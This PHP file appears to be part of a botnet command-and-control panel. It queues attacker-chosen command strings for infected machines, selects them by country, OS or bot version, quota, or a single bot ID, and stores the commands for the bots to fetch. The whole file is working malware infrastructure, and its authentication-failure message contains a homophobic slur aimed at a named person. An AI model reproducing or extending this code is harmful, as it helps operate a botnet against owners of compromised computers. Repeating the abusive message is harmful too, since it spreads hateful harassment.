<?php
	try {
		$Auth = new Auth();
		$Auth->RequireSession();
		$Auth->Ajax();
		$Auth->Validate(false);
	} catch(Exception $e) {
		die("fuck u faggot azuisleet");
	}

	if (isset($_POST["submit"])) {
		$Command = new BotCommand();
		$CommandString = $_POST["command"]; //The commandstring to send to the bots
		$CommandQuota = $_POST["commandquota"]; //The number of bots to run the command on, irrelevant if botid is passed.
		if (isset($_POST["filters"])) { //Issue command to a group of bots based on a filter
			$Filters = array();
			//Get a list of the filters to get bots from, i imagined the filters could be any of the bots fields
			//IE: I could make a filter by CountryCode, OSVerMajor/Minor and BotVerMajor/Minor or any combination of those
			//Pass an array of filters in the filter post var, filter[]=CountryCode=CA&filter[]=OSVerMajor=7
			//Make sure the filter keys match the columns found in the bots table.
			foreach ($_POST["filters"] as $Filter) {
				if (empty($Filter))
					continue;
				$FilterEx = explode("=", $Filter);
				$Key = $FilterEx[0];
				$Value = $FilterEx[1];
				if($Key == "OSVer" || $Key == "BotVer") {
					// Let's split this into OSVerMajor and OSVerMinor
					$Components = explode(".", $Value);
					if(!array_key_exists($Key . "Major", $Filters)) 
						$Filters[$Key . "Major"] = array();
					if(!array_key_exists($Key . "Minor", $Filters)) 
						$Filters[$Key . "Minor"] = array();
					$Filters[$Key . "Major"][] = $Components[0];
					$Filters[$Key . "Minor"][] = $Components[1];
				} else {
					if (!array_key_exists($Key, $Filters))
						$Filters[$Key] = array();
				
					$Filters[$Key][] = $Value;
				}
			}
			$Command->Set("Filters", json_encode($Filters));
		} elseif (isset($_POST["botid"])) { //Issue command to a single bot, based on ID
			$CommandQuota = 1; //Run on one bot.
			$TargetBotID = $_POST["botid"];
			$Command->Set("TargetBotID", $TargetBotID);
		}
		$Command->Set("CommandString", urldecode($CommandString));
		$Command->Set("CommandQuota", $CommandQuota);
		$Command->Set("IssueDate", time());
		$Command->Save();
		
		$this->CommandID = DB::GetLastID(); 
	}
?>